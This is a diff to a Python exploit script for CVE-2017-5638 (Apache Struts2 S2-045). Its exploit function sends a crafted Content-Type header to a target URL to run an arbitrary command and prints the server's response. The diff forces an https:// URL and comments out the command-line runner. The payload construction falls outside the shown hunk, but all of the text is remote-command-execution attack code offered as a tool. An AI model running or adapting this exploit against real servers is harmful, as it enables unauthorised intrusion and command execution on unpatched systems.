@@ -25,21 +25,18 @@ def exploit(url, cmd):
         'Content-Type': str(payload)
     }
     try:
+        url = "https://" + url + "/"
         out = requests.get(url, headers=hearders, allow_redirects=False).text
-   
     except Exception as e:
         out =  str(e)
-    
     print(out)
 
-def runner():
-    if len(sys.argv) != 3:
-        print("[*] struts2_S2-045.py <url> <cmd>")
-    else:
-        print('CVE: 2017-5638 - Apache Struts2')
-        url = sys.argv[1]
-        cmd = sys.argv[2]
-        exploit(url, cmd)
-
-
-runner()
+# def runner():
+#     if len(sys.argv) != 3:
+#         print("[*] struts2_S2-045.py <url> <cmd>")
+#     else:
+#         print('CVE: 2017-5638 - Apache Struts2')
+#         url = sys.argv[1]
+#         cmd = sys.argv[2]
+#         exploit(url, cmd)
+# runner()
